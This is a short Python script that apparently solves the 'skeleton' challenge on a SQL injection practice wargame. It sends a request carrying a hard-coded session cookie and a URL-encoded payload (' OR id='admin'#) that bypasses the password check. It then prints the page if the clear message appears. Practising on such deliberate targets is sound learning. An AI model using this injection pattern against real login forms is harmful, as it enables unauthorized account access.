import requests
headers= {'Cookie':'PHPSESSID=iot1jl8tr5l94b3la52t54ps8k'}
url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=%27%20OR%20id=%27admin%27%23"
r = requests.get(url, headers=headers).text
if "<h2>SKELETON Clear!</h2>" in r:
    print(r)
